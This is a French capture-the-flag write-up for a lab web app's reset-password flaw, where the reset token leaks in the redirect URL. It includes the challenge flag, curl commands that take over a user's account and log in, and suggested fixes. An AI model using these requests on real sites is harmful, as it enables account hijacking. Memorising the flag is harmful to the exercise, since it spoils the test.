# Reset password

flag: `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`

## Reproduire la faille:

Sur la page de connexion, si on clique sur "Forgot your password?"
On est redirige vers une page de recuperation de mot de passe

Si on saisit un email valide, comme "jdoe@student.42.tech", que l'on clique sur "Send reset link"

Alors on nous propose de saisir un nouveau mot de passe, sans aucune verification.

On peut alors modifier le mot de passe de cet utilisateur, par 'Qwerty1234!' par exemple.

De retour sur la page de connexion:

```
email: jdoe@student.42.tech
Mot de passe: Qwerty1234!
```

Ces identifiants fonctionnent desormais.

Cela ne fonctionne pas avec les compte qui ont un acces superieur.

Note: Le reset password fonctionne aussi pour un email aleatoire qui n'existe pas, mais ensuite la connexion a ce compte ne fonctionne pas.

## Explication de la faille:

Sur la page 'Reset password', lorsque l'on envoie un requete de reinitialisation de mot de passe, par exemple pour l'email "email=jdoe@student.42.tech"

```shell
target='127.0.0.1:4942'

curl -si -X POST "http://$target/reset-password/request" \
  --data-urlencode 'email=jdoe@student.42.tech'
```

On recoit la reponse suivante:

```
HTTP/1.1 302 Found
location: /reset-password?email=jdoe@student.42.tech&token=5ae99e7ca0a3fd84337cecfa705f5321
```

On recoit donc le token de reinitialisation de mot de passe directement !
On peut donc se servir de cette faille pour surcharger et modifier le mot de passe de ce compte:

```shell
reset_token='5ae99e7ca0a3fd84337cecfa705f5321'

curl -si -X POST "http://$target/reset-password/confirm" \
  --data-urlencode 'email=jdoe@student.42.tech' \
  --data-urlencode "token=$reset_token" \
  --data-urlencode 'new_password=Qwerty1234!'
```

# Solutions:

- Mettre une limite de tentative pour `/reset-password/request`
- Ne pas mettre le token dans la reponse
- Envoyer un lien de reinitialisation par mail plutot que de demander directement le nouveau mot de passe.

## shell


```shell
# set var
target='127.0.0.1:4942'
target_email='jdoe@student.42.tech'
wanted_password='qwerty'

# reset password flow for jdoe (see forum post)
curl -si -X POST "http://$target/reset-password/request" \
  --data-urlencode 'email=jdoe@student.42.tech'

# set token from response
reset_token=5ae99e7ca0a3fd84337cecfa705f5321

# create new password
curl -si -X POST "http://$target/reset-password/confirm" \
  --data-urlencode "email=$target_email" \
  --data-urlencode "token=$reset_token" \
  --data-urlencode "new_password=$wanted_password"

# authenticate and store cookie
cookies_file='cookies_jdoe.txt'

curl -si -X POST "http://$target/login" \
  --data-urlencode "identity=$target_email" \
  --data-urlencode "password=$wanted_password" \
  -c "$cookies_file"
```
